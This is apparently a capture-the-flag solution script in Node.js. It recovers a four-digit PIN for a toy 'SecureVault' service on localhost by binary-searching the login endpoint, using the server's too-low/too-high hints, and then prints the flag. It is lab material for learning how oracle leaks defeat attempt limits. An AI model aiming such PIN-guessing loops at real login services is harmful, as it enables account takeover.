// Binary Search Exploit Script for SecureVault
// Uses binary search to find the PIN in 14 attempts or less

const http = require('http');

const HOST = 'localhost';
const PORT = 3001;
const sessionId = 'exploit_' + Date.now();

async function tryPin(pin) {
    return new Promise((resolve, reject) => {
        const data = JSON.stringify({ pin: pin, sessionId: sessionId });

        const options = {
            hostname: HOST,
            port: PORT,
            path: '/api/login',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length
            }
        };

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(body));
                } catch (e) {
                    reject(e);
                }
            });
        });

        req.on('error', reject);
        req.write(data);
        req.end();
    });
}

async function binarySearch() {
    console.log('=== SecureVault Binary Search Attack ===');
    console.log('Using binary search to find PIN in ≤14 attempts\n');

    let low = 0;
    let high = 9999;
    let attempt = 0;

    while (low <= high) {
        const mid = Math.floor((low + high) / 2);
        const pin = mid.toString().padStart(4, '0');
        attempt++;

        console.log(`Attempt ${attempt}: Trying PIN ${pin} (range: ${low.toString().padStart(4, '0')} - ${high.toString().padStart(4, '0')})`);

        try {
            const result = await tryPin(pin);

            if (result.success) {
                console.log('\n========== SUCCESS! ==========');
                console.log(`PIN Found: ${pin}`);
                console.log(`Attempts: ${attempt}`);
                console.log(`FLAG: ${result.flag}`);
                console.log('==============================');
                return;
            }

            if (result.locked) {
                console.log('\n❌ VAULT LOCKED! Ran out of attempts.');
                return;
            }

            // Adjust search based on hint
            if (result.hint && result.hint.includes('LOW')) {
                low = mid + 1;
                console.log(`   → Too low, searching higher`);
            } else if (result.hint && result.hint.includes('HIGH')) {
                high = mid - 1;
                console.log(`   → Too high, searching lower`);
            }

        } catch (err) {
            console.error(`Error:`, err.message);
        }
    }

    console.log('Search complete - PIN not found (this should not happen!)');
}

binarySearch();
